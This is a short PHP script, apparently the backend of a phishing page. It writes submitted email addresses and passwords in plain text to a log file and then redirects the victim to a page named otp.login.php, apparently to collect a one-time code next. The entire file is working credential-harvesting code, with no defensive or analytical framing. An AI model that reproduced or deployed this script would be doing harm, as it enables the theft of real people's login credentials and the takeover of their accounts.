<?php

    file_put_contents("log.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] , FILE_APPEND);
header('Location: otp.login.php');
exit();

